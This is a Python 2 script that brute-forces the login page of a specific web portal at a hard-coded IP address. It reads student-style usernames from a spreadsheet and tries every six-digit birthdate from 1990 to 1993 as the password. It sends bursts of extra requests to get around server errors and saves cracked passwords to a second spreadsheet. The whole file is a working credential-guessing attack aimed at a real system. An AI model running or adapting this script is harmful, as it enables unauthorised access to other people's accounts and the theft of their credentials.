#-*- coding: utf-8 -*-
import requests
import time
import xlrd
import datetime
import xlwt
start_url='http://59.78.108.51/WebUI/login.aspx'
two=xlwt.Workbook()
sheet1=two.add_sheet('sheet1')
 
def get_info():
	user_num=[]
	data = xlrd.open_workbook('1.xlsx')
	table = data.sheets()[0]
	for i in table.col_values(0):
		i=i.replace(u'\xa0','')
		if 'Y' in i:
			user_num.append(i.encode('utf-8'))
	return user_num
def password():
	usernames=[]
	date_start= datetime.datetime(1990,1,1)
	for i in range(366*4):
		nextday=date_start+datetime.timedelta(days=i)
		usernames.append(str(nextday.strftime('%Y%m%d')[2:]))
	return usernames
def network():
	m=0
	for i in get_info():
		k=0
		for j in password():
			data={'__VIEWSTATE':'','username':'','password':'','btnlogin':'登录'}
			data['password']=j
			data['username']=i
			data['__VIEWSTATE']='dDwtOTMzMDQ3NzYwOzs+hFF2Y5VKeI+VJQLWEx9Dc7eMB34='
			real_pssw='none'
			headers={'Host':'59.78.108.51','Connection':'keep-alive','Content-Length':'129','Cache-Control':'max-age=0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Origin':'http://59.78.108.51','User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0','Content-Type':'application/x-www-form-urlencoded','Referer':'http://59.78.108.51/WebUI/login.aspx','Accept-Encoding':'gzip,deflate','Accept-Language':'zh-CN,zh;q=0.8'}
			r=requests.post(url=start_url,timeout=100,data=data)
			print i
			if 'FRAME' not in r.text :
				if 'window.alert' in r.text:
					pass
				else:
					print '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
					for n in range(10):
						data['__VIEWSTATE']='dDwtOTMMDQ3NzYwOzs+hFF2Y5VKeI+VJQLWEx9Dc7eMB34='
						#重置链接，防止500
						data['password']=j
						data['username']=i
						r=requests.post(url=start_url,timeout=100,data=data)
						print '*******************'
			else:
				real_pssw=j
				break
			k+=1
			#重置链接，防止500
			if k>=50:
				for n in range(10):
					data['__VIEWSTATE']='dDwtOTMMDQ3NzYwOzs+hFF2Y5VKeI+VJQLWEx9Dc7eMB34='
					data['password']=j
					data['username']=i
					r=requests.post(url=start_url,timeout=100,data=data)
					print '*******************'
				k=0
			else:
				pass
		print real_pssw+'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@'
		m+=1
		sheet1.write(m,0,real_pssw)
network()
two.save('2.xlsx')